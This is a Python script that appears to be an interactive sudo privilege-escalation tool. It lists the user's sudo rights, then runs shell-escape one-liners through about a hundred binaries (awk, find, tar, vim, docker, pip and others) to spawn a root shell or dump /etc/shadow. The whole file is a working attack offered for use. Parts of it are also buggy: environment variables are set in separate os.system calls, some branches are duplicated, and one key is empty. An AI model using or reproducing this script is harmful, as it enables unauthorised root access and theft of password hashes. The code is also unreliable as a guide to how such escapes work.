from cmath import inf
import os
from re import S
import sys
import keyboard
import pyfiglet


ascii_banner = pyfiglet.figlet_format("Hello!! PRIVESC SUDO")
print(ascii_banner )
print('')
print('')
print('')
os.system('sudo -l')


quest=input('elige el SUDO deseado:').lower()

def main():
    if quest == 'all':
        os.system('sudo -i')
    elif quest == 'bash':
        os.system('sudo bash')
    elif quest == 'nmap':
        os.system('sudo nmap --interactive')
        os.system('!sh')
    elif quest == 'zsh':
        os.system('sudo zsh')
    elif quest == 'apt-get':
        os.system('sudo apt-get changelog apt')
        os.system('!/bin/sh')
    elif quest == 'apt':
        os.system('sudo apt changelog apt')
        os.system('!/bin/sh')
    elif quest == 'awk':
        c1='BEGIN {system("/bin/sh")}'
        os.system(f"sudo awk '{c1}'")
    elif quest == 'base32':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo base32 $LFILE | base32 --decode')
    elif quest == 'base64':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo base32 $LFILE | base64 --decode')
    elif quest == 'c89':
        os.system('sudo c89 -wrapper /bin/sh,-s .')
    elif quest == 'c99':
        os.system('sudo c99 -wrapper /bin/sh,-s .')
    elif quest == 'c99':
        os.system('sudo c99 -wrapper /bin/sh,-s .')
    elif quest == 'cat':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo cat $LFILE')
    elif quest == 'chmod':
        os.system('cd /tmp/')
        os.system('echo "/bin/sh" > exp.sh')
        os.system('sudo chmod 4000 exp.sh')
        os.system('sudo chmod +x exp.sh')
        os.system('sudo ./exp.sh')
    elif quest == 'chroot':
        os.system('sudo chroot /')
    elif quest == 'cp':
        os.system('sudo cp /bin/sh /bin/cp')
        os.system('sudo cp')
    elif quest == 'cut':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo cut -d "" -f1 "$LFILE"')
    elif quest == 'dash':
        os.system('sudo dash')
    elif quest == 'date':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo date -f $LFILE')
    elif quest == 'diff':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo diff --line-format=%L /dev/null $LFILE')
    elif quest == 'csh':
        os.system('sudo csh')
    elif quest == 'crash':
        os.system('sudo crash -h')
        os.system('!sh')
    elif quest == 'cpan':
        os.system('sudo cpan')
        os.system("! exec '/bin/bash'")
    elif quest == 'crontab':
        os.system('sudo crontab -e')
    elif quest == 'dmesg':
        os.system('sudo dmesg -H')
        os.system('!/bin/sh')
    elif quest == 'dmsetup':
        os.system('sudo dmsetup create base <<EOF')
        os.system('0 3534848 linear /dev/loop0 94208')
        os.system('EOF')
        os.system("sudo dmsetup ls --exec '/bin/sh -s'")
    elif quest == 'docker':
        os.system('sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh')
    elif quest == 'dpkg':
        os.system('sudo dpkg -l')
        os.system('!/bin/sh')
    elif quest == 'eb':
        os.system('sudo eb logs')
        os.system('!/bin/sh')
    elif quest == 'ed':
        os.system('sudo ed')
        os.system('!/bin/sh')
    elif quest == 'efax':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo efax -d $LFILE')
    elif quest == 'env':
        os.system('sudo env /bin/sh')
    elif quest == 'eqn':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo eqn $LFILE')
    elif quest == 'ex':
        os.system('sudo ex')
        os.system('!/bin/sh')
    elif quest == 'expand':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo expand $LFILE')
    elif quest == 'expect':
        os.system("sudo expect -c 'spawn /bin/sh;interact'")
    elif quest == 'facter':
        os.system('TF=$(mktemp -d)')
        c2='("/bin/sh")'
        os.system(f"echo 'exec{c2}' > $TF/x.rb")
        os.system('sudo FACTERLIB=$TF facter')
    elif quest == 'file':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo file -f $LFILE')
    elif quest == 'find':
        os.system('sudo find . -exec /bin/sh \; -quit')
    elif quest == 'fish':
        os.system('sudo fish')
    elif quest == 'flock':
        os.system('sudo flock -u / /bin/sh')
    elif quest == 'ftp':
        os.system('sudo ftp')
        os.system('!/bin/sh')
    elif quest == 'gcc':
        os.system('sudo gcc -wrapper /bin/sh,-s .')
    elif quest == 'gcore':
        os.system('sudo gcore $PID')
    elif quest == 'gdb':
        os.system("sudo gdb -nx -ex '!sh' -ex quit")
    elif quest == 'ginsh':
        os.system('sudo ginsh')
        os.system('!/bin/sh')
    elif quest == 'git':
        c3='"exec sh 0<&1"'
        os.system(f"sudo PAGER='sh -c {c3}' git -p help")
    elif quest == 'grep':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo grep '' $LFILE')
    elif quest == 'gzip':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo gzip -f $LFILE -t')
    elif quest == 'iftop':
        os.system('sudo iftop')
        os.system('!/bin/sh')
    elif quest == 'ionice':
        os.system('sudo ionice /bin/sh')
    elif quest == 'irb':
        os.system('sudo irb')
        os.system("exec '/bin/bash'")
    elif quest == 'ispell':
        os.system('sudo ispell /etc/passwd') 
        os.system('!/bin/sh')
    elif quest == 'less':
        os.system('sudo less /etc/profile') 
        os.system('!/bin/sh')
    elif quest == 'lftp':
        os.system("sudo lftp -c '!/bin/sh'")
    elif quest == 'ln':
        os.system('sudo ln -fs /bin/sh /bin/ln')
        os.system('sudo ln')
    elif quest == 'loginctl':
        os.system('sudo loginctl user-status')
        os.system('!/bin/sh')
    elif quest == 'logsave':
        os.system('sudo logsave /dev/null /bin/sh -i')
    elif quest == 'look':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo look '' $LFILE')
    elif quest == 'ltrace':
        os.system('sudo ltrace -b -L /bin/sh')
    elif quest == 'lua':
        c4='"/bin/sh"'
        os.system(f"sudo lua -e 'os.execute({c4})'")
    elif quest == 'make':
        os.system("COMMAND='/bin/sh'")
        c5="'x:\n\t-'"
        os.system(f'sudo make -s --eval=${c5}"$COMMAND"')
    elif quest == 'man':
        os.system('sudo man man')
        os.system('!/bin/sh')
    elif quest == 'mount':
        os.system('sudo mount -o bind /bin/sh /bin/mount')
        os.system('sudo mount')
    elif quest == 'mtr':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo mtr --raw -F $LFILE')
    elif quest == 'multitime':
        os.system('sudo multitime /bin/sh')
    elif quest == 'mv':
        os.system('LFILE=file_to_write') #CHANGE THIS
        os.system('TF=$(mktemp)')
        os.system('echo "DATA" > $TF')
        os.system('sudo mv $TF $LFILE')
    elif quest == 'mysql':
        os.system("sudo mysql -e '\! /bin/sh'")
    elif quest == 'nano':
        os.system('sudo nano')
        keyboard.press_and_release('ctrl+r')
        keyboard.press_and_release('ctrl+x')
        os.system('reset; sh 1>&0 2>&0')
    elif quest == 'nasm':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo nasm -@ $LFILE')
    elif quest == 'nmap':
        c6='("/bin/sh")'
        os.system('TF=$(mktemp)')
        os.system(f"echo 'os.execute{c6}' > $TF")
        os.system('sudo nmap --script=$TF')
    elif quest == '':
        os.system(f"sudo perl -e 'exec {c4};'")
    elif quest == 'pg':
        os.system('sudo pg /etc/profile')
        os.system('!/bin/sh')
    elif quest == 'php':
        os.system('CMD="/bin/sh"')
        c7="'$CMD'"
        os.system(f'sudo php -r "system({c7});"')
    elif quest == 'pip':
        c8="('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"
        os.system('TF=$(mktemp -d)')
        os.system('echo "import os; os.execl{c8}" > $TF/setup.py')
        os.system('sudo pip install $TF')
    elif quest == 'pkexec':
        os.system('sudo pkexec /bin/sh')
    elif quest == 'pry':
        os.system('sudo pry')
        os.system('system("/bin/sh")')
    elif quest == 'psftp':
        os.system('sudo psftp')
        os.system('!/bin/sh')
    elif quest == 'psql':
        os.system('sudo psql')
        os.system('\?')
        os.system('!/bin/sh')
    elif quest == 'python':
        os.system(f"sudo python -c 'import os; os.system({c4})'")
    elif quest == 'rev':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo rev $LFILE | rev')
    elif quest == 'rlwrap':
        os.system('sudo rlwrap /bin/sh')
    elif quest == 'ruby':
        os.system(f"sudo ruby -e 'exec {c4}'")
    elif quest == 'screen':
        os.system('sudo screen')
    elif quest == 'sash':
        os.system('sudo sash')
    elif quest == 'script':
        os.system('sudo script -q /dev/null')
    elif quest == 'scrot':
        os.system('sudo scrot -e /bin/sh')
    elif quest == 'service':
        os.system('sudo service ../../bin/sh')
    elif quest == 'sg':
        os.system('sudo sg root')
    elif quest == 'slsh':
        os.system(f"sudo slsh -e 'system({c4})'")
    elif quest == 'split':
        os.system('sudo split --filter=/bin/sh /dev/stdin')
    elif quest == 'ss':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo ss -a -F $LFILE')
    elif quest == 'ssh':
        os.system("sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x")
    elif quest == 'strace':
        os.system('sudo strace -o /dev/null /bin/sh')
    elif quest == 'strings':
        os.system('LFILE=/etc/shadow') #CAHNGE THIS
        os.system('sudo strings $LFILE')
    elif quest == 'su':
        os.system('sudo su')
    elif quest == 'tar':
        os.system('sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh')
    elif quest == 'task':
        os.system('sudo task execute /bin/sh')
    elif quest == 'time':
        os.system('sudo /usr/bin/time /bin/sh')
    elif quest == 'tmux':
        os.system('sudo tmux')
    elif quest == 'vi':
        os.system("sudo vi -c ':!/bin/sh' /dev/null")
    elif quest == 'view':
        os.system("sudo view -c ':!/bin/sh'")
    elif quest == 'vigr':
        os.system('sudo vigr')
    elif quest == 'vim':
        os.system("sudo vim -c ':!/bin/sh'")
    elif quest == 'vimdiff':
        os.system("sudo vimdiff -c ':!/bin/sh'")
    elif quest == 'vipw':
        os.system('sudo vipw')
    elif quest == 'xargs':
        os.system('sudo xargs -a /dev/null sh')
    elif quest == 'watch':
        os.system("sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'")
    elif quest == 'unshare':
        os.system('sudo unshare /bin/sh')
    else:
        print('I have not that SUDO')

main()